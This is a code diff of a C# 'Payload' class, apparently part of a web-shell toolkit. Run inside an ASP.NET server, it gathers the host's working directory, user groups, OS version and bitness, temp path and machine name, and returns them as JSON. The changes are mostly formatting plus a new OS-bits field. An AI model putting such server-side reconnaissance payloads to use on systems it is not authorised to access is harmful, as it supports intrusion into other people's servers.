@@ -6,10 +6,12 @@ using System.Runtime.Serialization;
 using System.Runtime.Serialization.Json;
 using System.Security.Principal;
 
-public class Payload{
+public class Payload
+{
 
     [DataContract]
-    class Ret {
+    class Ret
+    {
         [DataMember]
         public string pwd;
 
@@ -33,10 +35,14 @@ public class Payload{
 
         [DataMember]
         public string host;
+
+        [DataMember]
+        public int os_bits;
     }
     Ret ret;
     HttpContext context = HttpContext.Current;
-    public string Run(){
+    public string Run()
+    {
         var ident = WindowsIdentity.GetCurrent();
         ret = new Ret();
         ret.pwd = context.Server.MapPath(".");
@@ -46,20 +52,25 @@ public class Payload{
         string tmp0 = "";
         IdentityReferenceCollection irc = ident.Groups;
         foreach (IdentityReference ir in irc)
-            tmp0 += GetNameFromSID(ir.Value)+Path.PathSeparator;
+            tmp0 += GetNameFromSID(ir.Value) + Path.PathSeparator;
         ret.group = tmp0;
         ret.os_type = Environment.OSVersion.VersionString;
         ret.tmpdir = Path.GetTempPath();
         ret.sep = System.IO.Path.DirectorySeparatorChar;
         ret.host = context.Server.MachineName;
+        ret.os_bits = IntPtr.Size == 8?64:32;
         return Global.json_encode(ret);
     }
 
-    string GetNameFromSID(string sid){
+    string GetNameFromSID(string sid)
+    {
         string name = sid;
-        try{
+        try
+        {
             name = new SecurityIdentifier(sid).Translate(typeof(NTAccount)).ToString();
-        }catch(Exception){
+        }
+        catch (Exception)
+        {
             return sid;
         }
         return name;
